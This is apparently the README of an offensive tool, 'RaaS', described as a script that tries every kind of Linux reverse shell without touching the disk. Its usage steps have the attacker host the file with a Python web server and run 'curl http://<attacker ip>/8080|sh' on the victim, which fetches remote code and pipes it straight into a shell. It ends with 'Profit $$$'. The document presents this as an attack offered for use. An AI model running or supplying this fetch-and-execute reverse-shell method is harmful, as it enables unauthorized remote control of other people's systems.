# RaaS
Reverse shell as a Service script that tries all the different reverse shells on Linux systems without touching the disk.

# Usage
1. Host the file on your system
   $ python3 -m http.server 8080

2. Grab the file using Curl and pipe it to bash
   $ curl http://<attacker ip>/8080|sh

3. Profit $$$
